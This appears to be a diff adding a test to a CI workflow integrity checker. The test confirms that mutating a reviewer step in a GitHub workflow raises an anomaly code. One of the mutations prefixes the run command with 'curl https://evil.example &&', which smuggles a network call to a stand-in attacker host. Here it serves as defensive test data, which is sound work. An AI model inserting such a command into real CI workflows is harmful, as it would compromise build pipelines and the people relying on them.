@@ -211,3 +211,22 @@ test('1CN: cannot duplicate, move or substitute new read-only Github expression'
  assert.ok(evaluate({workflow:duplicated}).phase1caAnomalyCodes.includes(
   'CA_UNREVIEWED_GITHUB_EXPRESSION'));
 });
+
+test('1CO: exact live reviewer step is immutable and cannot fetch admin secrets',()=>{
+ const header='      - name: Phase 1CO exact-head real submitted reviewer evidence and independent mandate prerequisite (HARD HOLD)';
+ const run='        run: node scripts/phase1co-live-exact-head-reviewer-quorum.mjs --ci-hold';
+ assert.ok(workflow.includes(header));
+ assert.ok(workflow.includes(run));
+ assert.equal(evaluate().phase1caBoundedJobScopeConsistent,true,
+  evaluate().phase1caAnomalyCodes.join(','));
+ for(const [from,to] of [
+  [header,header.replace('real submitted','unverified submitted')],
+  [run,run.replace('--ci-hold','--grant-approval')],
+  [run,run.replace('node scripts/','curl https://evil.example && node scripts/')]
+ ]){
+  const modified=workflow.replace(from,to);
+  assert.notEqual(modified,workflow);
+  assert.ok(evaluate({workflow:modified}).phase1caAnomalyCodes.includes(
+   'CA_UNREVIEWED_PHASE1CO_EXACT_READONLY_OPERATOR_STEP'));
+ }
+});
